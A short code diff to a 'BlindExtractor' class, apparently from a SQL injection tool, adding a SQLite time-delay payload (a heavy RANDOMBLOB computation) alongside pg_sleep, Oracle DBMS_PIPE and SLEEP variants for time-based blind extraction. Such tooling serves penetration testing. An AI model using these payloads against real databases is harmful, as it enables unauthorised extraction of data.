@@ -219,6 +219,9 @@ class BlindExtractor:
             sleep_expr = f"pg_sleep({self.time_delay})"
         elif dbms == "oracle":
             sleep_expr = f"DBMS_PIPE.RECEIVE_MESSAGE('a',{int(self.time_delay)})"
+        elif dbms == "sqlite":
+            # SQLite has no SLEEP() — use heavy computation as delay
+            sleep_expr = f"LIKE('ABCDEFG',UNICODE(RANDOMBLOB(500000000)))"
         else:
             sleep_expr = f"SLEEP({self.time_delay})"
         
